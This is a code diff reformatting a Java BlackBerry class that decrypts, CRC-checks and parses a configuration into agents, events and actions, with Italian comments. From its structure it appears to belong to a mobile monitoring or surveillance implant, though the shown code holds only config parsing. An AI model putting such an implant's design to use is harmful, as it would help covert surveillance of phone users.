@@ -13,7 +13,6 @@ import java.io.IOException;
 import java.io.InputStream;
 
 import net.rim.device.api.util.DataBuffer;
-
 import blackberry.action.Action;
 import blackberry.agent.Agent;
 import blackberry.config.Keys;
@@ -34,7 +33,7 @@ import blackberry.utils.Utils;
 public class Conf {
 
     /** The debug instance. */
-	//#debug
+    //#debug
     private static Debug debug = new Debug("Conf", DebugLevel.VERBOSE);
 
     public static final String NEW_CONF = "newconfig.dat";
@@ -84,10 +83,10 @@ public class Conf {
      *            the crc expected
      * @return true, if successful
      */
-    public static boolean crcVerify(byte[] payload, int crcExpected) {
+    public static boolean crcVerify(final byte[] payload, final int crcExpected) {
         boolean crcOK = false;
 
-        int crcCalc = Utils.crc(payload);
+        final int crcCalc = Utils.crc(payload);
         crcOK = (crcExpected == crcCalc);
 
         return crcOK;
@@ -129,7 +128,7 @@ public class Conf {
     public boolean load() {
 
         boolean ret = true;
-        byte[] confKey = Keys.getInstance().getConfKey();
+        final byte[] confKey = Keys.getInstance().getConfKey();
         AutoFlashFile file;
 
         file = new AutoFlashFile(Path.SD_PATH + Path.CONF_DIR
@@ -138,11 +137,11 @@ public class Conf {
             ret = loadCyphered(file.read(), confKey);
             if (ret) {
                 // #debug
-                 debug.info("Forced config");
+                debug.info("Forced config");
                 return true;
             } else {
                 // #debug
-                 debug.error("Reading forced configuration");
+                debug.error("Reading forced configuration");
                 file.delete();
             }
         }
@@ -153,12 +152,12 @@ public class Conf {
 
             if (ret) {
                 // #debug
-                 debug.info("New config");
+                debug.info("New config");
                 file.rename(Conf.ACTUAL_CONF);
                 return true;
             } else {
                 // #debug
-                 debug.error("Reading new configuration");
+                debug.error("Reading new configuration");
                 file.delete();
             }
         }
@@ -168,30 +167,63 @@ public class Conf {
             ret = loadCyphered(file.read(), confKey);
             if (ret) {
                 // #debug
-                 debug.info("Actual config");
+                debug.info("Actual config");
                 return true;
             } else {
                 // #debug
-                 debug.error("Reading actual configuration");
+                debug.error("Reading actual configuration");
                 file.delete();
             }
         }
 
         // #debug
-         debug.warn("Reading Conf from resourses");
+        debug.warn("Reading Conf from resourses");
 
-        InputStream i0 = Conf.class.getResourceAsStream("config/config.bin");
+        final InputStream i0 = Conf.class
+                .getResourceAsStream("config/config.bin");
         if (i0 != null) {
             // #ifdef DBC
-                        Check.asserts(i0 != null, "Resource config");
+            Check.asserts(i0 != null, "Resource config");
             // #endif
             ret = loadCyphered(i0, confKey);
 
         } else {
             // #debug
-             debug.error("Cannot read config from resources");
+            debug.error("Cannot read config from resources");
             ret = false;
         }
+
+        return ret;
+    }
+
+    /**
+     * Load cyphered.
+     * 
+     * @param cyphered
+     *            the cyphered
+     * @param confKey
+     *            the conf key
+     * @return true, if successful
+     */
+    public boolean loadCyphered(final byte[] cyphered, final byte[] confKey) {
+        int len;
+        boolean ret = false;
+
+        final int cryptoOffset = 8;
+
+        len = cyphered.length;
+        // #debug
+        debug.trace("cypher len: " + len);
+
+        final Encryption crypto = new Encryption();
+        crypto.makeKey(confKey);
+
+        final byte[] plainconf = crypto.decryptData(cyphered, cryptoOffset);
+        // #debug
+        debug.trace("plain len: " + plainconf.length);
+
+        // lettura della configurazione
+        ret = parseConf(plainconf, 0);
 
         return ret;
     }
@@ -211,39 +243,15 @@ public class Conf {
 
         try {
             len = i0.available();
-            byte[] cyphered = new byte[len];
+            final byte[] cyphered = new byte[len];
             i0.read(cyphered);
 
             ret = loadCyphered(cyphered, confKey);
 
-        } catch (IOException e) {
+        } catch (final IOException e) {
             // #debug
-             debug.error("Cannot read cyphered");
+            debug.error("Cannot read cyphered");
         }
-
-        return ret;
-    }
-
-    public boolean loadCyphered(byte[] cyphered, final byte[] confKey) {
-        int len;
-        boolean ret = false;
-
-        final int cryptoOffset = 8;
-
-        len = cyphered.length;
-        // #debug
-         debug.trace("cypher len: " + len);
-
-        Encryption crypto = new Encryption();
-        crypto.makeKey(confKey);
-
-        byte[] plainconf = crypto.decryptData(cyphered, cryptoOffset);
-        // #debug
-         debug.trace("plain len: " + plainconf.length);
-        cyphered = null;
-
-        // lettura della configurazione
-        ret = parseConf(plainconf, 0);
 
         return ret;
     }
@@ -257,36 +265,36 @@ public class Conf {
      * @throws EOFException
      *             the eOF exception
      */
-    boolean parseAction(DataBuffer databuffer) throws EOFException {
+    boolean parseAction(final DataBuffer databuffer) throws EOFException {
         if (actionIndex < 0) {
             // #debug
-             debug.trace("ParseAction - NO SECTION");
+            debug.trace("ParseAction - NO SECTION");
             return false;
         }
 
         databuffer.setPosition(actionIndex);
 
-        int numTokens = databuffer.readInt();
+        final int numTokens = databuffer.readInt();
 
         // #debug
-         debug.trace("ParseAction - numTokens: " + numTokens);
+        debug.trace("ParseAction - numTokens: " + numTokens);
 
         for (int idAction = 0; idAction < numTokens; idAction++) {
             // #debug
-             debug.trace("ParseEvent - Action: " + idAction);
-            Action action = new Action(idAction);
+            debug.trace("ParseEvent - Action: " + idAction);
+            final Action action = new Action(idAction);
 
-            int numSubActions = databuffer.readInt();
+            final int numSubActions = databuffer.readInt();
 
             for (int sub = 0; sub < numSubActions; sub++) {
-                int actionType = databuffer.readInt();
-                int paramLen = databuffer.readInt();
+                final int actionType = databuffer.readInt();
+                final int paramLen = databuffer.readInt();
 
-                byte[] confParams = new byte[paramLen];
+                final byte[] confParams = new byte[paramLen];
                 databuffer.readFully(confParams);
 
                 // #debug
-                 debug.trace("ParseEvent - addNewSubAction: " + actionType);
+                debug.trace("ParseEvent - addNewSubAction: " + actionType);
                 action.addNewSubAction(actionType, confParams);
             }
 
@@ -294,7 +302,7 @@ public class Conf {
         }
 
         // #debug
-         debug.trace("ParseAction - OK");
+        debug.trace("ParseAction - OK");
 
         return true;
     }
@@ -308,40 +316,40 @@ public class Conf {
      * @throws EOFException
      *             the eOF exception
      */
-    boolean parseAgent(DataBuffer databuffer) throws EOFException {
+    boolean parseAgent(final DataBuffer databuffer) throws EOFException {
         if (agentIndex < 0) {
             // #debug
-             debug.trace("ParseAgent - NO SECTION");
+            debug.trace("ParseAgent - NO SECTION");
             return false;
         }
 
         databuffer.setPosition(agentIndex + AGENT_CONF_DELIMITER.length() + 1);
 
-        int numTokens = databuffer.readInt();
+        final int numTokens = databuffer.readInt();
 
         // #debug
-         debug.trace("ParseAgent - numTokens: " + numTokens);
+        debug.trace("ParseAgent - numTokens: " + numTokens);
 
         for (int i = 0; i < numTokens; i++) {
-            int agentType = databuffer.readInt();
-            int agentStatus = databuffer.readInt();
-            int paramLen = databuffer.readInt();
+            final int agentType = databuffer.readInt();
+            final int agentStatus = databuffer.readInt();
+            final int paramLen = databuffer.readInt();
 
-            byte[] confParams = new byte[paramLen];
+            final byte[] confParams = new byte[paramLen];
             databuffer.readFully(confParams);
 
             // #mdebug
-             debug.trace("ParseAgent - factory: " + agentType + " status: "
-             + agentStatus);
+            debug.trace("ParseAgent - factory: " + agentType + " status: "
+                    + agentStatus);
             // #enddebug
 
-            boolean enabled = agentStatus == Common.AGENT_ENABLED;
-            Agent agent = Agent.factory(agentType, enabled, confParams);
+            final boolean enabled = agentStatus == Common.AGENT_ENABLED;
+            final Agent agent = Agent.factory(agentType, enabled, confParams);
             statusObj.addAgent(agent);
         }
 
         // #debug
-         debug.trace("ParseAgent - OK");
+        debug.trace("ParseAgent - OK");
 
         return true;
     }
@@ -355,31 +363,31 @@ public class Conf {
      *            the offset
      * @return true, if successful
      */
-    public boolean parseConf(byte[] plainConf, int offset) {
-        DataBuffer databuffer = new DataBuffer(plainConf, offset,
+    public boolean parseConf(final byte[] plainConf, final int offset) {
+        final DataBuffer databuffer = new DataBuffer(plainConf, offset,
                 plainConf.length - offset, false);
 
         // Check crc e sezioni
         try {
             // leggo la lunghezza del plain
-            int len = databuffer.readInt();
+            final int len = databuffer.readInt();
             // calcolo la lunghezza del payload, togliendo il crc
-            int payloadSize = len - 4;
+            final int payloadSize = len - 4;
 
             if (len <= 0 || payloadSize <= 0) {
                 // #debug
-                 debug.error("Conf len error");
+                debug.error("Conf len error");
                 return false;
             }
 
             byte[] payload = new byte[0];
 
             // #debug
-             debug.trace("Allocating size:" + payloadSize);
+            debug.trace("Allocating size:" + payloadSize);
 
             if (payloadSize > plainConf.length) {
                 // #debug
-                 debug.error("wrong decoding len");
+                debug.error("wrong decoding len");
                 return false;
             }
 
@@ -390,14 +398,14 @@ public class Conf {
 
             // leggo il crc
             databuffer.setPosition(payloadSize);
-            int crcExpected = databuffer.readInt();
+            final int crcExpected = databuffer.readInt();
 
             // verifico il crc
-            boolean crcOK = crcVerify(payload, crcExpected);
+            final boolean crcOK = crcVerify(payload, crcExpected);
 
             if (!crcOK) {
                 // #debug
-                 debug.error("ParseConf - CRC FAILED");
+                debug.error("ParseConf - CRC FAILED");
                 return false;
             }
 
@@ -405,16 +413,16 @@ public class Conf {
             searchSectionIndex(payload);
 
             // #ifdef DBC
-                        Check.asserts(                  
-                                endofIndex + ENDOF_CONF_DELIMITER.length() + 4 == len,
-                                "ENDOF Wrong");
+            Check.asserts(
+                    endofIndex + ENDOF_CONF_DELIMITER.length() + 4 == len,
+                    "ENDOF Wrong");
             // #endif
             //#debug
             debug.trace("ParseConf - CRC OK");
 
-        } catch (EOFException e) {
+        } catch (final EOFException e) {
             // #debug
-             debug.error("ParseConf - FAILED");
+            debug.error("ParseConf - FAILED");
             return false;
         }
 
@@ -422,39 +430,39 @@ public class Conf {
         try {
             if (!parseAgent(databuffer)) {
                 // #debug
-                 debug.error("ParseAgent - FAILED [0]");
+                debug.error("ParseAgent - FAILED [0]");
                 return false;
             }
 
             // Sezione Eventi
             if (!parseEvent(databuffer)) {
                 // #debug
-                 debug.error("ParseEvent - FAILED [1]");
+                debug.error("ParseEvent - FAILED [1]");
                 return false;
             }
 
             // Sezione Azioni
             if (!parseAction(databuffer)) {
                 // #debug
-                 debug.error("ParseAction - FAILED [2]");
+                debug.error("ParseAction - FAILED [2]");
                 return false;
             }
 
             // Leggi i parametri di configurazione
             if (!parseParameters(databuffer)) {
                 // #debug
-                 debug.error("ParseParameters - FAILED [3]");
+                debug.error("ParseParameters - FAILED [3]");
                 return false;
             }
 
-        } catch (EOFException e) {
+        } catch (final EOFException e) {
             // #debug
-             debug.error("ParseConf - FAILED:" + e);
+            debug.error("ParseConf - FAILED:" + e);
             return false;
         }
 
         // #debug
-         debug.trace("ParseConf - OK");
+        debug.trace("ParseConf - OK");
         return true;
     }
 
@@ -467,39 +475,39 @@ public class Conf {
      * @throws EOFException
      *             the eOF exception
      */
-    boolean parseEvent(DataBuffer databuffer) throws EOFException {
+    boolean parseEvent(final DataBuffer databuffer) throws EOFException {
         if (eventIndex < 0) {
             // #debug
-             debug.trace("ParseEvent - NO SECTION");
+            debug.trace("ParseEvent - NO SECTION");
             return false;
         }
 
         databuffer.setPosition(eventIndex + EVENT_CONF_DELIMITER.length() + 1);
 
-        int numTokens = databuffer.readInt();
+        final int numTokens = databuffer.readInt();
 
         // #debug
-         debug.trace("ParseEvent - numTokens: " + numTokens);
+        debug.trace("ParseEvent - numTokens: " + numTokens);
 
         for (int i = 0; i < numTokens; i++) {
-            int eventType = databuffer.readInt();
-            int actionId = databuffer.readInt();
-            int paramLen = databuffer.readInt();
+            final int eventType = databuffer.readInt();
+            final int actionId = databuffer.readInt();
+            final int paramLen = databuffer.readInt();
 
-            byte[] confParams = new byte[paramLen];
+            final byte[] confParams = new byte[paramLen];
             databuffer.readFully(confParams);
 
             // #mdebug
-             debug.trace("ParseEvent - factory: " + i
-             + " type: " + eventType
-             + " action: " + actionId);
+            debug.trace("ParseEvent - factory: " + i + " type: " + eventType
+                    + " action: " + actionId);
             // #enddebug
-            Event event = Event.factory(i, eventType, actionId, confParams);
+            final Event event = Event.factory(i, eventType, actionId,
+                    confParams);
             statusObj.addEvent(i, event);
         }
 
         // #debug
-         debug.trace("ParseEvent - OK");
+        debug.trace("ParseEvent - OK");
 
         actionIndex = databuffer.getPosition();
 
@@ -515,28 +523,28 @@ public class Conf {
      * @throws EOFException
      *             the eOF exception
      */
-    boolean parseParameters(DataBuffer databuffer) throws EOFException {
+    boolean parseParameters(final DataBuffer databuffer) throws EOFException {
         if (mobileIndex < 0) {
             // #debug
-             debug.trace("ParseParameters - NO SECTION");
+            debug.trace("ParseParameters - NO SECTION");
             return false;
         }
 
         databuffer.setPosition(mobileIndex + MOBIL_CONF_DELIMITER.length() + 1);
 
-        int numTokens = databuffer.readInt();
+        final int numTokens = databuffer.readInt();
 
         // #debug
-         debug.trace("ParseParameters - numTokens: " + numTokens);
+        debug.trace("ParseParameters - numTokens: " + numTokens);
 
         for (int i = 0; i < numTokens; i++) {
-            int confId = databuffer.readInt();
-            int paramLen = databuffer.readInt();
+            final int confId = databuffer.readInt();
+            final int paramLen = databuffer.readInt();
 
-            byte[] confParams = new byte[paramLen];
+            final byte[] confParams = new byte[paramLen];
             databuffer.readFully(confParams);
 
-            Parameter config = Parameter.factory(confId, confParams);
+            final Parameter config = Parameter.factory(confId, confParams);
             statusObj.addParameter(config);
         }
 
@@ -549,7 +557,7 @@ public class Conf {
      * @param payload
      *            the payload
      */
-    public void searchSectionIndex(byte[] payload) {
+    public void searchSectionIndex(final byte[] payload) {
         agentIndex = Utils.getIndex(payload, AGENT_CONF_DELIMITER.getBytes());
         eventIndex = Utils.getIndex(payload, EVENT_CONF_DELIMITER.getBytes());
         mobileIndex = Utils.getIndex(payload, MOBIL_CONF_DELIMITER.getBytes());
@@ -557,12 +565,12 @@ public class Conf {
         endofIndex = Utils.getIndex(payload, ENDOF_CONF_DELIMITER.getBytes());
 
         // #debug
-         debug.trace("searchSectionIndex - agentIndex:" + agentIndex);
+        debug.trace("searchSectionIndex - agentIndex:" + agentIndex);
         // #debug
-         debug.trace("searchSectionIndex - eventIndex:" + eventIndex);
+        debug.trace("searchSectionIndex - eventIndex:" + eventIndex);
         // #debug
-         debug.trace("searchSectionIndex - mobileIndex:" + mobileIndex);
+        debug.trace("searchSectionIndex - mobileIndex:" + mobileIndex);
         // #debug
-         debug.trace("searchSectionIndex - endofIndex:" + endofIndex);
+        debug.trace("searchSectionIndex - endofIndex:" + endofIndex);
     }
 }
